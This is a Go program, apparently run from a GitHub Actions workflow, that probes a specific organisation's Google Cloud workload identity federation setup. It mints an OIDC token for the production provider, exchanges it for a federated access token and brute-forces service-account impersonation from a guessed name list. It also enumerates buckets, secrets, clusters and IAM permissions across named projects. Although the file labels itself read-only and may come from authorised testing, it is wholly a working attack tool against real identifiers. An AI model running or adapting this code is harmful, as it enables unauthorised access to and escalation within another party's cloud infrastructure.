package main

// WIF SA-binding breadth probe (intent 40228). READ-ONLY, single-shot, low volume.
// Mints a GitHub OIDC JWT for the production gh-provider audience from a SELF-OWNED repo,
// exchanges it at STS for a federated access_token, then probes whether ANY service account
// / resource grants the pool principalSet permissions without a repo-scoped condition.

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const provider = "//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"
const providerName = "projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"

var audiences = []string{
	"https://iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	"//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
}

var projects = []string{"devops-f467c7d5", "production-1-3d0475e1", "recurly-corporate-ai"}

// common CI/deploy SA local-parts + known ones from OSINT (dbt docs)
var saLocals = []string{
	"github-actions", "github", "cloud-build", "cloudbuild", "deploy", "deployment",
	"terraform", "tf", "compute", "appengine", "cloud-run", "cloudrun", "ci", "cd",
	"ci-cd", "devops", "dps-looker", "platform-analytics", "dbt", "dataform", "looker",
	"gcs-sync", "infra", "admin", "github-actions-deploy", "default", "builder",
}

var client = &http.Client{Timeout: 45 * time.Second}

func decodePayload(jwt string) string {
	parts := strings.Split(jwt, ".")
	if len(parts) != 3 {
		return "decode-failed"
	}
	b, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		b, err = base64.URLEncoding.DecodeString(parts[1])
		if err != nil {
			return "decode-failed: " + err.Error()
		}
	}
	return string(b)
}

func httpDo(method, u, bearer string, body []byte) (int, string) {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rdr)
	if err != nil {
		return 0, "req-error:" + err.Error()
	}
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "do-error:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func trim(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func main() {
	fmt.Println("=== WIF-BREADTH PROBE START ===")
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if reqURL == "" {
		fmt.Println("no ACTIONS_ID_TOKEN_REQUEST_URL")
		return
	}

	var jwt string
	for _, aud := range audiences {
		u := reqURL + "&audience=" + url.QueryEscape(aud)
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("Authorization", "bearer "+reqTok)
		req.Header.Set("Accept", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var oidc struct{ Value string `json:"value"` }
		json.Unmarshal(b, &oidc)
		if oidc.Value != "" {
			jwt = oidc.Value
			fmt.Println("OIDC_PAYLOAD:", decodePayload(jwt))
			break
		}
	}
	if jwt == "" {
		fmt.Println("failed to mint jwt")
		return
	}

	// STS exchange
	sbody, _ := json.Marshal(map[string]string{
		"audience": provider, "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
		"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
		"scope":              "https://www.googleapis.com/auth/cloud-platform",
		"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
		"subjectToken":       jwt,
	})
	st, sb := httpDo("POST", "https://sts.googleapis.com/v1/token", "", sbody)
	fmt.Println("STS_STATUS:", st)
	var tok struct {
		AccessToken string `json:"access_token"`
		ExpiresIn   int    `json:"expires_in"`
	}
	json.Unmarshal([]byte(sb), &tok)
	if tok.AccessToken == "" {
		fmt.Println("STS_RESPONSE:", trim(sb, 400))
		return
	}
	ft := tok.AccessToken
	fmt.Println("FEDERATED_TOKEN_ACQUIRED len:", len(ft), "expires_in:", tok.ExpiresIn)

	// ---- identity / provider config ----
	st2, sb2 := httpDo("GET", "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token="+url.QueryEscape(ft), "", nil)
	fmt.Println("TOKENINFO_STATUS:", st2, "BODY:", trim(sb2, 300))
	st3, sb3 := httpDo("GET", "https://www.googleapis.com/oauth2/v1/userinfo", ft, nil)
	fmt.Println("USERINFO_STATUS:", st3, "BODY:", trim(sb3, 300))

	// read the WIF provider config (attributeCondition) - READ ONLY
	stp, sbp := httpDo("GET", "https://iam.googleapis.com/v1/"+providerName, ft, nil)
	fmt.Println("WIF_PROVIDER_GET:", stp, trim(sbp, 600))
	stpl, sbpl := httpDo("GET", "https://iam.googleapis.com/v1/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers", ft, nil)
	fmt.Println("WIF_PROVIDERS_LIST:", stpl, trim(sbpl, 400))

	// ---- project discovery ----
	st4, sb4 := httpDo("GET", "https://cloudresourcemanager.googleapis.com/v1/projects", ft, nil)
	fmt.Println("CRM_PROJECTS_LIST:", st4, trim(sb4, 800))
	for _, p := range projects {
		stx, sbx := httpDo("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+p, ft, nil)
		fmt.Printf("CRM_PROJECT_GET[%s]: %d %s\n", p, stx, trim(sbx, 400))
		// list service accounts
		sa, sab := httpDo("GET", "https://iam.googleapis.com/v1/projects/"+p+"/serviceAccounts", ft, nil)
		fmt.Printf("IAM_SA_LIST[%s]: %d %s\n", p, sa, trim(sab, 1500))
	}

	// ---- generateAccessToken for candidate SAs ----
	for _, p := range projects {
		for _, loc := range saLocals {
			email := loc + "@" + p + ".iam.gserviceaccount.com"
			tryImpersonate(ft, email)
		}
		// project-number based & appspot
		if p == "devops-f467c7d5" {
			tryImpersonate(ft, "597679076120-compute@developer.gserviceaccount.com")
			tryImpersonate(ft, "597679076120@cloudbuild.gserviceaccount.com")
		}
		tryImpersonate(ft, p+"@appspot.gserviceaccount.com")
	}

	// ---- resource-level enumeration ----
	for _, p := range projects {
		enumerateResources(ft, p)
	}

	fmt.Println("=== WIF-BREADTH PROBE END ===")
}

func tryImpersonate(ft, email string) {
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
	body, _ := json.Marshal(map[string]interface{}{
		"scope": []string{"https://www.googleapis.com/auth/cloud-platform"},
		"lifetime": "300s",
	})
	st, sb := httpDo("POST", u, ft, body)
	mark := ""
	if st == 200 {
		mark = "  <<< SUCCESS IMPERSONATION"
	}
	fmt.Printf("GENAT[%s]: %d %s%s\n", email, st, trim(sb, 220), mark)
}

func enumerateResources(ft, p string) {
	type probe struct{ name, url string }
	probes := []probe{
		{"GCS_BUCKETS", "https://storage.googleapis.com/storage/v1/b?project=" + p},
		{"CLOUDRUN_SVC", "https://run.googleapis.com/v2/projects/" + p + "/locations/-/services"},
		{"ARTIFACT_REPOS", "https://artifactregistry.googleapis.com/v1/projects/" + p + "/locations/-/repositories"},
		{"SECRETS", "https://secretmanager.googleapis.com/v1/projects/" + p + "/secrets"},
		{"GKE_CLUSTERS", "https://container.googleapis.com/v1/projects/" + p + "/locations/-/clusters"},
		{"COMPUTE_INSTANCES", "https://compute.googleapis.com/compute/v1/projects/" + p + "/aggregated/instances"},
	}
	for _, pr := range probes {
		st, sb := httpDo("GET", pr.url, ft, nil)
		fmt.Printf("%s[%s]: %d %s\n", pr.name, p, st, trim(sb, 400))
	}
	// testIamPermissions on the project
	body, _ := json.Marshal(map[string]interface{}{
		"permissions": []string{
			"resourcemanager.projects.get", "resourcemanager.projects.getIamPolicy",
			"iam.serviceAccounts.actAs", "iam.serviceAccounts.getAccessToken",
			"storage.buckets.list", "run.services.list", "secretmanager.versions.access",
			"cloudbuild.builds.create", "container.clusters.get",
		},
	})
	st, sb := httpDo("POST", "https://cloudresourcemanager.googleapis.com/v1/projects/"+p+":testIamPermissions", ft, body)
	fmt.Printf("TEST_IAM_PERMS[%s]: %d %s\n", p, st, trim(sb, 400))
}
